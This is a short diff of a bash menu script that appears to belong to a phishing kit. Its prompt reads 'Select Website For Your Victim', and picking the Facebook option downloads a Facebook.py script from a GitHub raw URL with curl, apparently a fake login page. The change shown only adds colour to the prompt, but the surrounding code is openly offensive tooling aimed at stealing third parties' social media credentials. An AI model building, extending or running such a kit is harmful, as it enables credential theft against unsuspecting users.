@@ -67,7 +67,7 @@ echo ""
 echo -e "${RED}[${GREEN}1${RED}]${BOLD}${GREEN} FACEBOOK page ${NC}"
 echo -e "${RED}[${GREEN}0${RED}]${BOLD}${GREEN} EXIT ${NC}"
 echo ""
-read -p "Select Website For Your Victim: " choice
+read -p "$(echo -e ${CYAN} Select Website For Your Victim: ${NC} )" choice
 
 if [ "$choice" == "1" ]; then
   curl -L -o Facebook.py https://raw.githubusercontent.com/Surajdas007272/Spider/main/Facebook.py
